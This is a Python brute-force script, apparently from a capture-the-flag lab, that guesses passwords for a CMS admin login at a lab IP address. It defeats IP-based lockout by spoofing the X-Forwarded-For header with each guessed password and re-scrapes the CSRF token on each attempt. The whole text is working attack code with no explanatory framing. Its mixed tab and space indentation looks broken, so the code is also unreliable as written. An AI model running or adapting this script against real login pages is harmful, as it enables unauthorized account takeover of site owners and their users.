import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login.php'
username = 'fergus'
wordlist = []
def file_read(fname):
    	with open(fname) as f:
	 
            	for line in f:
                    	wordlist.append(line.strip())   
            	print(wordlist)
file_read('password.txt')
# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
	session = requests.Session()
	login_page = session.get(login_url)
	csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

	print('[*] Trying: {p}'.format(p = password))

	headers = {
    	'X-Forwarded-For': password,
    	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
    	'Referer': login_url
	}

	data = {
    	'tokenCSRF': csrf_token,
    	'username': username,
    	'password': password,
    	'save': ''
	}
	login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
    if 'location' in login_result.headers :
        print()
        print('SUCCESS: Password found!')
        print('Use {u}:{p} to login.'.format(u = username, p = password))
        print()
        break